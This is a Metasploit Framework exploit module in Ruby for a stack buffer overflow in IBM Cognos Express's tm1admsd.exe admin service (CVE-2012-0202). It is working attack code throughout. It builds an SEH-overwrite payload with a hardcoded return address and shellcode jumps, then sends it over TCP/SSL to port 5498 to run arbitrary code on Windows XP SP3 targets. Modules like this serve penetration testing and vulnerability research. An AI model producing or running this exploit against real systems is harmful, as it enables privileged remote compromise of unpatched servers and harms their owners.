##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'IBM Cognos tm1admsd.exe Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in IBM Cognos Analytic Server
				Admin service. The vulnerability exists in the tm1admsd.exe component, due to a
				dangerous copy of user controlled data to the stack, via memcpy, without validating
				the supplied length and data. The module has been tested successfully on IBM Cognos
				Express 9.5 over Windows XP SP3.
			},
			'Author'         =>
				[
					'Unknown', # Original discovery
					'juan vazquez' # Metasploit module
				],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					['CVE', '2012-0202'],
					['OSVDB', '80876'],
					['BID', '52847'],
					['URL', 'http://www.zerodayinitiative.com/advisories/ZDI-12-101/'],
					['URL', 'http://www-01.ibm.com/support/docview.wss?uid=swg21590314']
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'SSL' => true,
					'SSLVersion' => 'TLS1'
				},
			'Payload'        =>
				{
					'Space'    => 10359,
					'DisableNops' => true
				},
			'Platform'       => 'win',
			'DefaultTarget'  => 0,
			'Targets'        =>
				[
					# tm1admsd.exe 9.5.10009.10070
					# ret from unicode.nls # call dword ptr ss:[ebp+0x30] # tested over Windows XP SP3 updates
					[ 'IBM Cognos Express 9.5 / Windows XP SP3', { 'Ret' => 0x00280b0b, 'Offset' => 10359 } ]
				],
			'DisclosureDate' => 'Apr 02 2012'))

			register_options([Opt::RPORT(5498)], self.class)
	end

	def exploit

		sploit = payload.encoded
		sploit << rand_text(target['Offset'] - sploit.length)
		sploit << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-#{target['Offset']}").encode_string
		sploit << "\xEB\xF9" + rand_text(2) # jmp $-5
		sploit << [target.ret].pack("V") # seh
		sploit << rand_text(2000) # Trigger exception

		data = rand_text(4)
		data << "\x00\x08" # Opcode
		data << [sploit.length].pack("n") # Length
		data << sploit # Value

		length = [data.length + 2].pack("n")

		req = length
		req << data

		connect
		sock.put(req)
		disconnect

	end
end

